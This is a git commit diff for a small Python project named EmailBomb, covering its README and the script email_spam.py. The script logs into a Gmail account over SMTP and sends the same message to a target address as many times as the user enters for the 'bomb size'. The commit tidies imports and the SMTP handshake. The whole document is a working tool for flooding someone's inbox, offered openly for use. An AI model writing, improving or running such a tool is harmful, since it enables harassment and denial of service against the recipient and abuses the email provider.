2c88725f7f6b53c62fad422ae62ff117f7eade25
Aidan <agoldfa7@u.rochester.edu>
2020-07-16 18:35:55 -0400

    v1.1

--- README.md
+++ README.md
@@ -1,3 +1,7 @@
 # EmailBomb
 Currently supports bombs from
--Gmail
+- Gmail
+
+##Version
+1.0- Initial script
+1.1- Removed unneccesary libraries and calls 
--- email_spam.py
+++ email_spam.py
@@ -1,9 +1,8 @@
 import smtplib
-import sys
-import time
 import getpass
 
 gmail_server = "smtp.gmail.com"
+port = 587
 
 count = raw_input("Enter bomb size: ")
 from_email = raw_input("\nEnter email to spam from: ")
@@ -11,9 +10,10 @@ password = getpass.getpass("\nPassword: ")
 to_email = raw_input("\nEnter email to spam: ")
 email_text = raw_input("\nEmail text: ")
 #
-server = smtplib.SMTP(gmail_server, 587)
+server = smtplib.SMTP(gmail_server, port)
 server.ehlo()
 server.starttls()
+server.ehlo()
 server.login(from_email,password)
 for i in range(int(count)):
 	server.sendmail(from_email, to_email, email_text)
